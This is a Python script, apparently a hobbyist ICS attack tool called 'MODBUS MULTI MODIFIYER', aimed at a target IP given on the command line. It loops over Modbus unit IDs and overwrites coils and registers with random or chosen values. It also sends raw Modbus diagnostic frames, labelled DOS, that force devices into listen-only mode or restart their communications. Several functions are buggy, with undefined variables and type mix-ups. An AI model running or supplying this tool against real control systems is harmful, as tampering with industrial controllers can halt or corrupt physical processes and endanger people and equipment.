import os,sys,time,random,threading,socket

os.system("clear")
print('''MODBUS MULTI MODIFIYER
           tool written by X3N0V3RS3
                Modes:
              |1 = Normal/Boolean/Coil|
              |2 = Random Float|
              |3 = Schneider --WIP|
              |4 = Random Word|
              |5 = DOS (Force Listen Only) --wip| 
              |6 = Chosen Word|
              |7 = DOS (Restart Comm) --wip|)
              |8 = Get Device Info
              |9 = One Register at a time on a single unit
              ''')

ip = sys.argv[1]

mode = input("Select Mode :")

if mode != 9:
  slaveid = 0
  slaveid +=1

startadd = int(input("Enter Address to start from :"))
startadd+=1

amount = int(input("Amount to read/write from :"))
if mode != '9':
 devrange = input("Number of Devices to write in range 1,248: ")

def normal():   
   #b = mixer.mix()
   a = f'{b} ' *  amount
   print("BEFORE")
   time.sleep(1)
   os.system(f"modbus read -s {slaveid} {ip} {startadd} {amount}")
   time.sleep(1)
   print("WRITING")
   x = os.system(f"modbus write -s {slaveid} {ip} {startadd} {a}")
   print(ip,"SlaveID:",slaveid,x)
   time.sleep(1)
   print("AFTER")
   os.system(f"modbus read -s {slaveid} {ip} {startadd} {amount}")

def modicon():
   b = random.random()
   a = f'{b} ' * 501
   time.sleep(0.5)
   print("BEFORE")
   os.system(f"modbus read --modicon --float -s {slaveid} {ip} 1 501")
   print("WRITING")
   x = os.system(f"modbus write --modicon --float -s {slaveid} {ip} 1 {a}")
   print(ip,"SlaveID:",slaveid,x)
   time.sleep(0.5)
   print("AFTER")
   os.system(f"modbus read --modicon --float -s {slaveid} {ip} 1 501")

def schneider():
   b = input("number to write to coils (examples: 101, %MW100, 47100, random: ")
   time.sleep(2)
   print("BEFORE")
   os.system(f"modbus read -s {slaveid} {ip} %MW100 500")
   time.sleep(2)
   print("WRITING")
   y = os.system(f"modbus write -s {slaveid} {ip} {c} ")
   print(ip,slaveid,y)
   time.sleep(2)
   print("AFTER")
   os.system(f"modbus read -s {slaveid} {ip} %MW100 500")

def randomword():   
   b = str(random.randint(1,65000))
   a = f'{b} ' * 500 
   print("BEFORE")
   os.system(f"modbus read --word -s {slaveid} {ip} {startadd} {amount}")
   print("WRITING")
   x = os.system(f"modbus write --word -s {slaveid} {ip} {startadd} {a}")
   print(ip,"SlaveID:",slaveid,x)
   print("AFTER")
   os.system(f"modbus read --word -s {slaveid} {ip} {startadd} {amount}")


def dos():
  #LISTEN MODE DOS
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   port = 502
   payload = ('\x00\x01\x00\x00\x00\x06\x01\x08\x00\x04\x00\x01'*100)
   s.connect((ip, port))
   s.send(bytes(payload, "UTF-8"))
   print(s.recv(2048))
  # print(slaveid)
   s.close     

def singleword():   
   a = f'{b} ' * 500 
   print("BEFORE")
   time.sleep(1)
   os.system(f"modbus read --word -s {slaveid} {ip} {startadd} {amount}")
   print("WRITING")
   time.sleep(1)
   x = os.system(f"modbus write --word -s {slaveid} {ip} {startadd} {a}")
   print(ip,"SlaveID:",slaveid,x)
   print("AFTER")
   time.sleep(1)
   os.system(f"modbus read --word -s {slaveid} {ip} {startadd} {amount}")

def dos2():
  #RESTART DOS
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   port = 502
   payload = ('\x00\x01\x00\x00\x00\x06\x01\x08\x00\x01\x00\x01'*100)
   s.connect((ip, port))
   s.send(bytes(payload, "UTF-8"))
   print(s.recv(2048))
  # print(slaveid)
   s.close 

def getinfo():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   port = 502
   payload = ('\x00\x01\x00\x00\x00\x06\x01\x11\x00\x00\x00\x00')
   s.connect((ip, port))
   s.send(bytes(payload, "UTF-8"))
   print(s.recv(2048))
  # print(slaveid)
   s.close 

def oneatatime():
   #SINGLE UNIT COIL WRITE
   for startadd in range(1,amount+1):
     time.sleep(1)
     print("BEFORE")
     os.system(f"modbus read -s {slaveid} {ip} {startadd} 1")
     time.sleep(1)
     print(f"SlaveID = {slaveid} Register = {startadd}")
     print("WRITING")
     x = os.system(f"modbus write -s {slaveid} {ip} {startadd} {b}")
     time.sleep(1)
     print("AFTER")
     os.system(f"modbus read -s {slaveid} {ip} {startadd} 1")
     time.sleep(1)
   
if mode == '1':
   b = int(input("number to write to coils (examples: 0 = OFF 1 = ON: "))
   for slaveid in range(0,int(devrange + 1)):   
        normal()

if mode == '2':
   for slaveid in range(0,248):
        modicon()

if mode == '3':
   for slaveid in range(0,248):
        schneider()

if mode == '4':
   for slaveid in range(0,248):
        b = str(random.randint(1,65535))
        randomword()

if mode == '5':
   for slaveid in range(0,248):
        t = threading.Thread(target=dos)
        t.start()
if mode == '6':
   b = input("Enter value to write :")
   for slaveid in range(0,248):
       singleword()

if mode == '7':
 for slaveid in range(0,248):
    dos2()

if mode == '8':
   getinfo()

if mode == '9':
  slaveid = input("Enter Device/Slave ID to write to :")
  b = int(input("number to write to coils (examples: 0 = OFF 1 = ON: "))
  oneatatime()
